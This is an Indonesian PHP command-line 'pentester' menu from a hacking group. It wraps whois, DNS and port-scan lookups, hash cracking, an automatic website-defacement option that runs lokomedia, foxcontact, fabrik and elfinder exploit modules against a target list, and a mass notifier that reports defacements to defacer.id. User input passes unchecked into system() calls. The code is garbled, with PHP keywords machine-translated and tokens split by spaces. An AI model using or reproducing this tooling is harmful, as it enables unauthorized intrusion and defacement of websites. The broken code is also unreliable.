<? php
// gausah ganti hak cipta kalo mau di hargai
// 99syndicate - Tim Anon Cyber
// Penulis Oleh: Mr.cakil
// laporan bug: mrcakil@programmer.net
function  disable_ob () {
	ini_set ( ' output_buffering ' , ' off ' );
	ini_set ( ' zlib.output_compression ' , false ); ini_set ( ' implisit_flush ' , true ); ob_implicit_flush ( true );
	while ( ob_get_level () > 0 ) {
		$ level  =  ob_get_level ();
		ob_end_clean ();
		if ( ob_get_level () ==  $ level );
	}
	if ( function_exists ( ' apache_setenv ' )) {
		apache_setenv ( ' no-gzip ' , ' 1 ' ); apache_setenv ( ' jangan-variasikan ' , ' 1 ' );
	}
}
@ system ( " clear " );
$ blue = " \ 033 [0; 34 " ;
$ cyan = " \ 033 [0; 36m " ;
$ green = " \ 033 [0; 34m " ;
$ okegreen = " \ 033 [92m " ;
$ lightgreen = " \ 033 [1; 32m " ;
$ white = " \ 033 [1; 37m " ;
$ red = " \ 033 [1; 31m " ;
$ yellow = " \ 033 [1; 33m " ;
cetak  " $ red
    ================================================== =====================================
    || ██████╗ ███████╗███╗ ██╗████████╗███████╗███████╗███ █████╗███████╗██████╗ ||
    || ██╔══██╗██╔════╝████╗ ██║╚══██╔══╝██╔════╝██╔════╝╚ ══██╔══╝██╔════╝██╔══██╗ ||
    || ██████╔╝█████╗ ██╔██╗ ██║ ██║ █████╗ ███████╗ ██║ █████╗ █ █████╔╝ ||
    || ██╔═══╝ ██╔══╝ ██║╚██╗██║ ██║ ██╔══╝ ╚════██║ ██║ ██╔══╝ █ █╔══██╗ ||
    || ██║ ███████╗██║ ╚████║ ██║ ███████╗███████║ ██║ ███████╗ ██║ ██║ ||
    || ╚═╝ ╚══════╝╚═╝ ╚═══╝ ╚═╝ ╚══════╝╚══════╝ ╚═╝ ╚══════╝╚ ═╝ ╚═╝ ||
    || || \ n " ;
cetak  " $ red         [============================================= ==============================] \ n " ;
cetak  " $ red                    TOOLS PENTESTER V2.3 \ n " ;
cetak  " $ red                    based: php-cli \ n " ;
print  " $ red                    Kode oleh Tn. Cakil 99syndicate \ n " ;
cetak  " $ white                    blog: http://99-syndicate.blogspot.com \ n " ;
print  " $ white                    contact: mrcakil@programmer.net \ n " ;
cetak  " $ white                    use: php namafile.php \ n " ;
print  " $ white                    Terima kasih kepada: Anon Cyber ​​Team - 99Syndicate \ n " ;
cetak  " $ white         [============================================= ==============================] \ n \ n
  [ $ red 1 $ white ] Whois Lookup
  [ $ red 2 $ white ] Traceroute
  [ $ red 3 $ white ] Pencarian DNS
  [ $ red 4 $ white ] Membalikkan Pencarian DNS
  [ $ red 5 $ white ] Pencarian GeoIP
  [ $ red 6 $ white ] Port Scan
  [ $ red 7 $ white ] Reverse IP Lookup
  [ $ red 8 $ white ] ping
  [ $ red 9 $ white ] http header memeriksa
transfer zona   [ $ red 10 $ white ]
  [ $ red 11 $ white ] md5 menghasilkan
  [ $ red 12 $ white ] md5 Decrypter
  [ $ red 13 $ white ] deface otomatis v1.2
  [ $ red 14 $ white ] encode base64
  [ $ red 15 $ white ] base64 decode
  [ $ red 16 $ white ] FindMyHash SH1
  [ $ red 17 $ white ] FindMyHash MD4
  [ $ red 18 $ white ] Pencari Admin
  [ $ red 19 $ white ] LALIN
  [ $ red 20 $ white ] Alat Peretas Keamanan Garuda
  [ $ red 21 $ white ] dirsearch
  [ $ red 22 $ white ] penginstal pentester v2.1
  [ $ red 23 $ white ] defacer.id mass notifier
  [ $ red 99 $ white ] keluar \ n " ;
gema  " pilihan => " ; $ cakil = trim ( fgets ( STDIN ));
if ( $ cakil == " 1 " ) {
	echo  " masukan ip atau domain: " ; $ whois = trim ( fgets ( STDIN ));
	@ system ( " curl http://api.hackertarget.com/whois/?q= $ whois " );
	gema  " selesai \ n " ;
}
elseif ( $ cakil == " 2 " ) {
		echo  " masukan ip atau domain: " ; $ traceroute = trim ( fgets ( STDIN ));
			@ system ( " curl https://api.hackertarget.com/mtr/?q= $ traceroute " );
			gema  " selesai \ n " ;
}
elseif ( $ cakil == " 3 " ) {
		echo  " masukan ip atau domain: " ; $ dns = trim ( fgets ( STDIN ));
         @ system ( " curl http://api.hackertarget.com/dnslookup/?q= $ dns " );
		 gema  " selesai \ n " ;
}
elseif ( $ cakil == " 4 " ) {
		echo  " masukan ip atau domain: " ; $ rev = trim ( fgets ( STDIN ));
      @ system ( " curl https://api.hackertarget.com/reversedns/?q= $ rev " );
	   gema  " selesai \ n " ;
}
elseif ( $ cakil == " 5 " ) {
		echo  " masukan ip atau domain: " ; $ geo = trim ( fgets ( STDIN ));
		@ system ( " curl http://api.hackertarget.com/geoip/?q= $ geo " );
		gema  " selesai \ n " ;
}
elseif ( $ cakil == " 6 " ) {
	echo  " masukan ip atau domain: " ; $ port = trim ( fgets ( STDIN ));
	@ system ( " curl http://api.hackertarget.com/nmap/?q= $ port " );
	gema  " selesai \ n " ;
}
elseif ( $ cakil == " 7 " ) {
	echo  " masukan ip atau domain: " ; $ revip = trim ( fgets ( STDIN ));
	@ system ( " wget http://api.hackertarget.com/reverseiplookup/?q= $ revip ; clear; curl http://api.hackertarget.com/reverseiplookup/?q= $ revip " );
	echo  " \ n file tersimpan gan " ;
	@ system ( " pwd " )
;
	echo  " \ n File: index.html? q = $ revip " ;
}
elseif ( $ cakil == " 8 " ) {
 echo  " masukan ip: " ; $ ping = trim ( fgets ( STDIN ));
@ system ( " curl https://api.hackertarget.com/nping/?q= $ ping " );
gema  " \ n selesai \ n " ;
}
elseif ( $ cakil == " 9 " ) {
 echo  " masukan ip atau domain: " ; $ header = trim ( fgets ( STDIN ));
@ system ( " curl https://api.hackertarget.com/httpheaders/?q= $ header " );
 gema  " selesai \ n " ;
}
elseif ( $ cakil == " 10 " ) {
 echo  " masukan ip atau domain: " ;
$ zone = trim ( fgets ( STDIN ));
@ system ( " curl https://api.hackertarget.com/zonetransfer/?q= $ zone " );
gema  " selesai \ n " ;
}
elseif ( $ cakil == " 11 " ) {
cetak   " \ n $ yellow masukan teks: " ;
$ kontol  =  trim ( fgets ( STDIN , 1024 ));
echo  " \ n $ lightgreen Sukses -> " , md5 ( $ tit ), " \ n " ;
}
 elseif ( $ cakil == " 12 " ) {
print  " \ n $ cyan masukan hash => " ;
$ mD5  =  trim ( fgets ( STDIN , 1024 ));
gema  " $ cyan
====================== \ n
Mohon tunggu Mastah 
Sedang mencari hash    \ n
====================== \ n " ;
@ system ( " python2 modules / findmyhash.py MD5 -h $ mD5 " );
}
 elseif ( $ cakil == " 13 " ) {
gema  " $ cyan 
============================================== \ n
paket exploiter: foxcontact / lokomedia / elfinder / com_fabrik \ n
============================================== \ n " ;
echo  " masukan daftar target => " ;
$ target  =  trim ( fgets ( STDIN ));
gema  " $ cyan 
= + = + = + = + = + = + = + = + = + = + = + = + = + = + = \ n
mencoba exploit Sql lokomedia \ n
= + = + = + = + = + = + = + = + = + = + = + = + = + = + = \ n " ;
@ system ( " modul php / xploit / lokomed.php $ target ; sleep 2 " );
gema  " $ cyan 
============================== \ n
mencoba exploit com_foxcontact \ n
============================== \ n " ;
@ system ( " modul php / xploit / foxcontact.php $ target ; sleep 2 " );
gema  " $ cyan
============================= \ n
mencoba exploit com_fabrik \ n
============================= \ n " ;
@ system ( " modul php / xploit / fabrik.php $ target ; sleep 2 " );
echo  " \ n $ cyan diterbitkan situs ex: www.google.com => " ;
$ elfinder  =  trim ( fgets ( STDIN ));
echo  " $ red 
======================== \ n
coba xploit elfinder \ n
======================== \ n " ;
@ system ( " modul php / xploit / elfinder.php $ elfinder " );
}
elseif ( $ cakil == " 14 " ) {
echo  " $ red masukan teks nya mastah => " ;
$ kontol  =  trim ( fgets ( STDIN , 1024 ));
@ system ( " echo $ kontol | base64; echo ' \ n Selesai Mastah' " );
}
 elseif ( $ cakil == " 15 " ) {
echo  " $ red transfer text nya mastah => " ;
$ decode  =  trim ( fgets ( STDIN , 1024 ));
@ system ( " echo $ decode | base64 -d; echo ' \ n Selesai mastah' " );
}
 elseif ( $ cakil == " 16 " ) {
echo  " masukan hash => " ;
$ SH1hash  =  trim ( fgets ( STDIN , 1024 ));
gema  " $ cyan
====================== \ n
Mohon tunggu Mastah 
Sedang mencari hash    \ n
====================== \ n " ;
@ system ( " modul python2 / findmyhash.py SHA1 -h $ SHA1hash " );
}
 elseif ( $ cakil == " 17 " ) {
echo  " masukan hash => " ;
$ md4  =  trim ( fgets ( STDIN , 1024 ));
gema  " $ cyan
====================== \ n
Mohon tunggu Mastah 
Sedang mencari hash    \ n
====================== \ n " ;
@ system ( " python2 modules / findmyhash.py MD4 -h $ md4 " );
}
 elseif ( $ cakil == " 18 " ) {
echo  " masukan url => " ;
$ adfin  =  trim ( fgets ( STDIN , 1024 ));
gema  " $ cyan
====================== \ n
Harap tunggu Mastah     \ n
====================== \ n " ;
@ system ( " sleep 2; modul php / adfin.php $ adfin start " );
}
 elseif ( $ cakil == " 19 " ) {
gema  " Silakan tunggu Mastah :) " ;
@ system ( " cd modules / LALIN; sudo bash Lalin.sh " );
}
 elseif ( $ cakil == " 20 " ) {
@ system ( " cd modules / gsh; sudo bash gshtool.sh " );
}
 elseif ( $ cakil == " 21 " ) {
echo  " masukan url => " ;
$ dirsearch  =  trim ( fgets ( STDIN , 1024 ));
@ system ( " modul python3 / dirsearch / dirsearch.py ​​-u http: // $ dirsearch / -e php " );
gema  "
[=========================] \ n
        DILAKUKAN MASTAH \ n
[=========================]] \ n " ;
}
 elseif ( $ cakil == " 22 " ) {
gema  "
======================= \ n
  Silakan Tunggu Mastah    \ n
======================= \ n " ;
sistem ( " sleep 2; alat bash " );
}
 elseif ( $ cakil == " 23 " ) {
gema  "
======================================
$ yellow PERINGATAN !!                            
$ red Alat ini Tergantung dari koneksi kamu
dan koneksi server defacer.id
tunggu 1-10 menit menunggu kosong dan tidak ada
periksa cermin mu
di: https://defacer.id
Biasanya no notif langsung masuk ke mirror mu
ok sekian dan terima kasih
Semoga hari mu menyenangkan           
Pembuat alat pemberi notifikasi massal: p4kl0nc4t
$ white ===================================== \ n " ;
echo  " masukan list situs kamu => " ;
$ site  =  trim ( fgets ( STDIN ));
echo  " masukan nick kamu => " ;
$ nick  =  trim ( fgets ( STDIN ));
echo  " masukan team team => " ;
$ team  =  trim ( fgets ( STDIN ));
gema  " $ kuning
========================================== \ n
     TUNGGU MASTAH SEDANG BERJALAN!   \ n
========================================= \ n " ;
@ disable_ob ();
sistem ( " defid_notifier $ situs  $ nick ' $ team ' " );
gema  " $ kuning
================================================= \ n
     Selesai Mastah Silahkan periksa            \ n
penyerang: https://defacer.id/archive/attacker/ $ nick  \ n
tim: https://defacer.id/archive/team/ $ team      \ n
================================================== ==== \ n " ;
}
 elseif ( $ cakil == " 99 " ) {
echo  " terima kasih mastah udah alat makai saya :) \ n " ;
@ system ( " sleep 4 " );
echo  " \ n hubungi: mrcakil@programmer.net \ n " ;
echo  " fb: http://facebook.com/dendisaimam.dendisaimam.1 \ n " ;
} lain {
echo  " kamu belom milih alat Mastah :( \ n " ;
}
? >